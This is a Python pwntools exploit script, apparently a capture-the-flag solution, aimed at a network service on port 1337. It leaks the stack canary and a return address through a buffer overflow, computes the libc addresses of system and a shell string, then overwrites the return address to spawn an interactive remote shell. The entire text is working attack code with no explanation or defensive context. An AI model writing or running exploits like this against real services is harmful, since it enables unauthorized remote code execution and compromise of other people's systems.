#!/usr/bin/env python
import pwn
import sys
import struct

c = pwn.remote(sys.argv[1], 1337)
c.send(b"1\n" + b"A" * (0x120 + 0x30) + b"\n")
c.recvuntil('new title:\n')
leak = c.recvline()
canary = struct.unpack("<I", leak[0x100:0x104])[0]
print "Canary is " + hex(canary)
retaddr = struct.unpack("<I", leak[0x140:0x144])[0]
print "Return is " + hex(retaddr)
system = retaddr + (0x3cd10 - 0x18e81)
sh = retaddr + (0x17b8cf - 0x18e81)
print "system is " + hex(system)
print "sh is " + hex(sh)
c.send(b"1\n" + b"A" * (0x80 - 48) + struct.pack("<I", canary + 1) + b"A" * 0x1c +
	struct.pack("<I", system) + b"AAAA" + struct.pack("<I", sh) + b"\n2\n")
c.send(b"1\n" + b"A" * (0x80 - 49) + b"\n2\n")
c.send(b"3\n")
c.interactive()
